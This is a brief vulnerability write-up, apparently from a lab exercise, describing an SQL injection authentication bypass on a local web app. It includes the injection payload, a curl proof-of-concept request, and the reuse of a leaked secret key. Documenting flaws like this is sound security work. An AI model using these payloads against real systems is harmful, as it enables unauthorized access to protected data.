# Authentication Bypass Attack

## Step 1: SQL Injection
Payload:
Saurabh' --

Result:
Login successful, secret key exposed

## Step 2: Unauthorized Access
Used leaked secret in Authorization header

## Impact:
Access to protected sensitive data

## Risk:
Critical - full authentication bypass

## Proof of Concept
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"Saurabh' --","password":"anything"}'
